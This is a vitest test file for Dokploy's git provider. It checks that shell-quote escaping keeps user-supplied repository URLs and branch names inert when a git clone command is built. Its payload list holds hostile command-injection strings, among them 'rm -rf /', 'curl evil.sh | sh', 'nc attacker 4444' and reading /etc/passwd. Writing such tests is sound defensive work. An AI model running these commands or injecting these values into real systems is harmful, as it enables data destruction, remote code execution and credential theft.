import { cloneGitRepository } from "@dokploy/server/utils/providers/git";
import { parse, quote } from "shell-quote";
import { describe, expect, it } from "vitest";

// How git-provider commands escape a single user value before it reaches the shell.
const shellArg = (value: string) => quote([String(value ?? "")]);

// Payloads that, if reached a shell unescaped, would execute commands.
const INJECTION_PAYLOADS = [
	"$(touch /tmp/pwned)",
	"`id`",
	"; rm -rf /",
	"&& curl evil.sh | sh",
	"| nc attacker 4444",
	"https://github.com/o/r.git$(whoami)",
	"main; wget http://evil",
	"$(cat /etc/passwd)",
];

// Legit values that must survive escaping unchanged.
const LEGIT_VALUES = [
	"main",
	"feature/login-v2",
	"release-1.2.3",
	"https://github.com/dokploy/dokploy.git",
	"https://gitlab.example.com/group/sub/project.git",
];

describe("git provider shell escaping (quote)", () => {
	it("collapses every injection payload into a single literal token (no shell operators)", () => {
		for (const payload of INJECTION_PAYLOADS) {
			const parsed = parse(shellArg(payload));
			// A safely escaped value parses back to exactly the original string,
			// as ONE token. If escaping failed, parse() would emit operator
			// objects such as { op: ";" } or { op: "$(" } instead.
			expect(parsed).toEqual([payload]);
		}
	});

	it("leaves legitimate URLs and branch names intact", () => {
		for (const value of LEGIT_VALUES) {
			expect(parse(shellArg(value))).toEqual([value]);
		}
	});
});

describe("cloneGitRepository command (customGitUrl path)", () => {
	const buildClone = (customGitUrl: string, customGitBranch: string) =>
		cloneGitRepository({
			appName: "demo-app",
			customGitUrl,
			customGitBranch,
			customGitSSHKeyId: null,
			enableSubmodules: false,
			serverId: null,
			type: "application",
		});

	// A malicious substring, once escaped, must survive parsing as inert literal
	// text and never as an executable command/operator. `parse()` turns command
	// substitution and control operators into { op } objects, so we assert the
	// injected marker only ever shows up inside a plain string token.
	const markerLeaksAsShellSyntax = (command: string, marker: string) => {
		const tokens = parse(command);
		return tokens.some(
			(t) => typeof t !== "string" && JSON.stringify(t).includes(marker),
		);
	};

	it("does not let a malicious customGitUrl inject shell operators", async () => {
		const command = await buildClone(
			"https://github.com/o/r.git$(touch /tmp/pwned)",
			"main",
		);
		expect(markerLeaksAsShellSyntax(command, "touch")).toBe(false);
		expect(command).toContain("git clone");
	});

	it("does not let a malicious customGitBranch inject shell operators", async () => {
		const command = await buildClone(
			"https://github.com/o/r.git",
			"main; touch /tmp/pwned",
		);
		// The branch is a single quoted token, so its ";" contributes no extra
		// operator and `touch` never becomes a runnable statement.
		expect(markerLeaksAsShellSyntax(command, "touch")).toBe(false);
		expect(command).not.toContain("touch /tmp/pwned;");
	});
});
